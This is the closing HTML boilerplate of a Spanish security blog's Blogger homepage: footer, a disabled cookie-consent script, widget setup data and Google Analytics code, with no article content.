</a>
</span>
</span>
<div class='clear'></div>
</div></div>
</div>
<!-- spacer for skins that want sidebar and main to be the same height-->
<div class='clear'>
              &#160;
            </div>
</div>
<!-- end content-wrapper -->
<div id='footer'>
<a href='#' id='gotop' onclick='MGJS.goTop();return false;'>
              Top
            </a>
<div id='copyright'>
              Copyright  2008 - 2017 
              <a href='http://www.hackplayers.com/'>
hackplayers
</a>
              All rights reserved. Powered by 
              <a href='http://blogger.com'>
                Blogger
              </a>
</div>
</div>
</div>
</div>
<!-- end outer-wrapper -->
</div>
<!-- efecto nieve -->
<!-- <script src='http://agudovk.googlepages.com/snow.js' type='text/javascript'/> -->
<!--Inicio política cookies - Desactivado porque Google ya lo implementa <div id='barracookies' style='display:none;position:fixed;left:0px;right:0px;bottom:0px;width:100%;min-height:20px;background: #848484;color:#000000;z-index: fcaaaa;'> <div style='width:100%;position:absolute;padding-left:4px;font-family:verdana;font-size:11px;top:20%;text-align:center;'> <span>Usamos cookies propias y de terceros. Si continuas navegando consideramos que aceptas el uso de cookies.</span> <a href='javascript:void(0);' onclick='PonerCookie();' style='padding:4px;background:#01DF01;text-decoration:none;color:#ffffff;border-radius:5px;'><b>OK</b></a> <a href='http://www.hackplayers.com/p/politica-de-cookies.html' rel='nofollow' style='padding-left:5px;text-decoration:none;color:#ffffff;' target='_blank'>Más información</a> </div> </div> <script> function getCookie(c_name){ var c_value = document.cookie; var c_start = c_value.indexOf(&quot; &quot; + c_name + &quot;=&quot;); if (c_start == -1){ c_start = c_value.indexOf(c_name + &quot;=&quot;); } if (c_start == -1){ c_value = null; }else{ c_start = c_value.indexOf(&quot;=&quot;, c_start) + 1; var c_end = c_value.indexOf(&quot;;&quot;, c_start); if (c_end == -1){ c_end = c_value.length; } c_value = unescape(c_value.substring(c_start,c_end)); } return c_value; } function setCookie(c_name,value,exdays){ var exdate=new Date(); exdate.setDate(exdate.getDate() + exdays); var c_value=escape(value) + ((exdays==null) ? &quot;&quot; : &quot;; expires=&quot;+exdate.toUTCString()); document.cookie=c_name + &quot;=&quot; + c_value; } if(getCookie(&#39;aviso&#39;)!=&quot;1&quot;){ document.getElementById(&quot;barracookies&quot;).style.display=&quot;block&quot;; } function PonerCookie(){ setCookie(&#39;aviso&#39;,&#39;1&#39;,365); document.getElementById(&quot;barracookies&quot;).style.display=&quot;none&quot;; } </script>-->
<!--Fin política cookies-->
<script src='https://apis.google.com/js/plusone.js' type='text/javascript'></script>

<script type="text/javascript" src="https://www.blogger.com/static/v1/widgets/698371418-widgets.js"></script>
<script type='text/javascript'>
window['__wavt'] = 'AOuZoY4V0vNVlHW3xe2LB57c0aTmzj7rQg:1521553663643';_WidgetManager._Init('//www.blogger.com/rearrange?blogID\x3d9133539773684103848','//www.hackplayers.com/','9133539773684103848');
_WidgetManager._SetDataContext([{'name': 'blog', 'data': {'blogId': '9133539773684103848', 'title': 'hackplayers', 'url': 'http://www.hackplayers.com/', 'canonicalUrl': 'http://www.hackplayers.com/', 'homepageUrl': 'http://www.hackplayers.com/', 'searchUrl': 'http://www.hackplayers.com/search', 'canonicalHomepageUrl': 'http://www.hackplayers.com/', 'blogspotFaviconUrl': 'http://www.hackplayers.com/favicon.ico', 'bloggerUrl': 'https://www.blogger.com', 'hasCustomDomain': true, 'httpsEnabled': false, 'enabledCommentProfileImages': true, 'gPlusViewType': 'FILTERED_POSTMOD', 'adultContent': false, 'analyticsAccountNumber': '', 'encoding': 'UTF-8', 'locale': 'es', 'localeUnderscoreDelimited': 'es', 'languageDirection': 'ltr', 'isPrivate': false, 'isMobile': false, 'isMobileRequest': false, 'mobileClass': '', 'isPrivateBlog': false, 'feedLinks': '\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22hackplayers - Atom\x22 href\x3d\x22http://www.hackplayers.com/feeds/posts/default\x22 /\x3e\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/rss+xml\x22 title\x3d\x22hackplayers - RSS\x22 href\x3d\x22http://www.hackplayers.com/feeds/posts/default?alt\x3drss\x22 /\x3e\n\x3clink rel\x3d\x22service.post\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22hackplayers - Atom\x22 href\x3d\x22https://www.blogger.com/feeds/9133539773684103848/posts/default\x22 /\x3e\n', 'meTag': '\x3clink rel\x3d\x22me\x22 href\x3d\x22https://www.blogger.com/profile/03053036399006390105\x22 /\x3e\n', 'openIdOpTag': '\x3clink rel\x3d\x22openid.server\x22 href\x3d\x22https://www.blogger.com/openid-server.g\x22 /\x3e\n\x3clink rel\x3d\x22openid.delegate\x22 href\x3d\x22http://www.hackplayers.com/\x22 /\x3e\n', 'adsenseClientId': 'ca-pub-7686406083489653', 'adsenseHostId': 'ca-host-pub-1556223355139109', 'adsenseHasAds': false, 'view': '', 'dynamicViewsCommentsSrc': '//www.blogblog.com/dynamicviews/4224c15c4e7c9321/js/comments.js', 'dynamicViewsScriptSrc': '//www.blogblog.com/dynamicviews/6724040bb52bb8c9', 'plusOneApiSrc': 'https://apis.google.com/js/plusone.js', 'sharing': {'platforms': [{'name': 'Obtener enlace', 'key': 'link', 'shareMessage': 'Obtener enlace', 'target': ''}, {'name': 'Facebook', 'key': 'facebook', 'shareMessage': 'Compartir en Facebook', 'target': 'facebook'}, {'name': 'Escribe un blog', 'key': 'blogThis', 'shareMessage': 'Escribe un blog', 'target': 'blog'}, {'name': 'Twitter', 'key': 'twitter', 'shareMessage': 'Compartir en Twitter', 'target': 'twitter'}, {'name': 'Pinterest', 'key': 'pinterest', 'shareMessage': 'Compartir en Pinterest', 'target': 'pinterest'}, {'name': 'Google+', 'key': 'googlePlus', 'shareMessage': 'Compartir en Google+', 'target': 'googleplus'}, {'name': 'Correo electrónico', 'key': 'email', 'shareMessage': 'Correo electrónico', 'target': 'email'}], 'googlePlusShareButtonWidth': 300, 'googlePlusBootstrap': '\x3cscript type\x3d\x22text/javascript\x22\x3ewindow.___gcfg \x3d {\x27lang\x27: \x27es\x27};\x3c/script\x3e'}, 'hasCustomJumpLinkMessage': true, 'jumpLinkMessage': 'Leer más...', 'pageType': 'index', 'pageName': '', 'pageTitle': 'hackplayers'}}, {'name': 'features', 'data': {'lazy_images': 'false', 'sharing_get_link_dialog': 'true', 'sharing_native': 'false'}}, {'name': 'messages', 'data': {'edit': 'Editar', 'linkCopiedToClipboard': 'El enlace se ha copiado en el Portapapeles.', 'ok': 'Aceptar', 'postLink': 'Enlace de la entrada'}}, {'name': 'template', 'data': {'name': 'custom', 'localizedName': 'Personalizado', 'isResponsive': false, 'isAlternateRendering': false, 'isCustom': true}}, {'name': 'view', 'data': {'classic': {'name': 'classic', 'url': '?view\x3dclassic'}, 'flipcard': {'name': 'flipcard', 'url': '?view\x3dflipcard'}, 'magazine': {'name': 'magazine', 'url': '?view\x3dmagazine'}, 'mosaic': {'name': 'mosaic', 'url': '?view\x3dmosaic'}, 'sidebar': {'name': 'sidebar', 'url': '?view\x3dsidebar'}, 'snapshot': {'name': 'snapshot', 'url': '?view\x3dsnapshot'}, 'timeslide': {'name': 'timeslide', 'url': '?view\x3dtimeslide'}, 'isMobile': false, 'title': 'hackplayers', 'description': 'Computer security, ethical hacking and more!', 'url': 'http://www.hackplayers.com/', 'type': 'feed', 'isSingleItem': false, 'isMultipleItems': true, 'isError': false, 'isPage': false, 'isPost': false, 'isHomepage': true, 'isArchive': false, 'isLabelSearch': false}}]);
_WidgetManager._RegisterWidget('_NavbarView', new _WidgetInfo('Navbar1', 'navbar', null, document.getElementById('Navbar1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_HeaderView', new _WidgetInfo('Header1', 'header', null, document.getElementById('Header1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML12', 'main', null, document.getElementById('HTML12'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_ImageView', new _WidgetInfo('Image2', 'main', null, document.getElementById('Image2'), {'resize': true}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogView', new _WidgetInfo('Blog1', 'main', null, document.getElementById('Blog1'), {'cmtInteractionsEnabled': false, 'useNgc': false, 'lightboxEnabled': true, 'lightboxModuleUrl': 'https://www.blogger.com/static/v1/jsbin/536969882-lbx__es.js', 'lightboxCssUrl': 'https://www.blogger.com/static/v1/v-css/368954415-lightbox_bundle.css'}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogListView', new _WidgetInfo('BlogList1', 'main', null, document.getElementById('BlogList1'), {'numItemsToShow': 0, 'totalItems': 58}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogListView', new _WidgetInfo('BlogList2', 'main', null, document.getElementById('BlogList2'), {'numItemsToShow': 0, 'totalItems': 77}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML9', 'main', null, document.getElementById('HTML9'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML2', 'sidebar', null, document.getElementById('HTML2'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML10', 'sidebar', null, document.getElementById('HTML10'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_StatsView', new _WidgetInfo('Stats1', 'sidebar', null, document.getElementById('Stats1'), {'title': 'Número de visitas', 'showGraphicalCounter': false, 'showAnimatedCounter': false, 'showSparkline': true, 'statsUrl': '//www.hackplayers.com/b/stats?style\x3dBLACK_TRANSPARENT\x26timeRange\x3dALL_TIME\x26token\x3dudthRWIBAAA.CcKel2AgtiqeSjk1e2J30fpV85LnVscTMtCuFSS0R4c.27P1pShh9AOLeIc-Hfcscg'}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_ImageView', new _WidgetInfo('Image3', 'sidebar', null, document.getElementById('Image3'), {'resize': false}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML5', 'sidebar', null, document.getElementById('HTML5'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_ImageView', new _WidgetInfo('Image4', 'sidebar', null, document.getElementById('Image4'), {'resize': true}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_PopularPostsView', new _WidgetInfo('PopularPosts1', 'sidebar', null, document.getElementById('PopularPosts1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_ImageView', new _WidgetInfo('Image1', 'sidebar', null, document.getElementById('Image1'), {'resize': true}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogArchiveView', new _WidgetInfo('BlogArchive1', 'sidebar', null, document.getElementById('BlogArchive1'), {'languageDirection': 'ltr', 'loadingMessage': 'Cargando\x26hellip;'}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML1', 'sidebar', null, document.getElementById('HTML1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_LabelView', new _WidgetInfo('Label1', 'sidebar', null, document.getElementById('Label1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML11', 'sidebar', null, document.getElementById('HTML11'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML7', 'sidebar', null, document.getElementById('HTML7'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML3', 'sidebar', null, document.getElementById('HTML3'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML6', 'sidebar', null, document.getElementById('HTML6'), {}, 'displayModeFull'));
</script>
</body>
<!-- google analytics - vmotos -->
<script type='text/javascript'>
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-12773754-2']);
               _gaq.push(['_trackPageview']);
               (function() {
               var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
               ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
               var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
               })();
  </script>
</html>